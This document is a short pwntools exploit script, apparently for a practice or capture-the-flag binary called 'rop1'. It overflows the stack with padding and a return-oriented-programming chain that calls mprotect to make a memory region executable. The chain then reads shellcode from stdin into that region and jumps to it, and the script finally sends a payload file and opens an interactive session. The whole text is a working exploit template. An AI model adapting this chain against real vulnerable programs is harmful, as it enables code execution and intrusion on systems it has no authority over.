#!/bin/python

from pwn import *


payload = open('./payload', 'rb').read()


context.terminal = ['alacritty', '-e', 'sh', '-c']

io = gdb.debug('./rop1', gdbscript = '''
    b main
    b *0x4017ae
    b *0x43f7e8
    c
        ''')


POP_RAX_ADDR = 0x43f7e7
POP_RDI_ADDR = 0x401cde
POP_RSI_ADDR = 0x40861e

SYSCALL_ADDR = 0x40efa4

POP_RDX_POP_RBX_ADDR = 0x46cebb


SYS_READ = 0
SYS_MPROTECT = 10


RW_ADDR = 0x4ae000


STDIN = 0


io.sendline(
        b'A' * 16 +
        b'B' * 8 +
        
        p64(POP_RAX_ADDR) +
        p64(SYS_MPROTECT) + 
        p64(POP_RDI_ADDR) +
        p64(RW_ADDR) +          # start
        p64(POP_RSI_ADDR) +
        p64(0x1000) +           # len
        p64(POP_RDX_POP_RBX_ADDR) +
        p64(7) +                # rwx
        p64(0xdeadbeefcafebabe) +
        p64(SYSCALL_ADDR) +

        p64(POP_RAX_ADDR) +
        p64(SYS_READ) +
        p64(POP_RDI_ADDR) +
        p64(STDIN) +
        p64(POP_RSI_ADDR) +
        p64(RW_ADDR) +
        p64(POP_RDX_POP_RBX_ADDR) +
        p64(0x1000) +
        p64(0xdeadbeefcafebabe) +
        p64(SYSCALL_ADDR) +

        p64(RW_ADDR)
    )

pause()     # if no debugger was attached to the appliaction we could use sleep(...)

io.sendline(payload)

io.interactive()
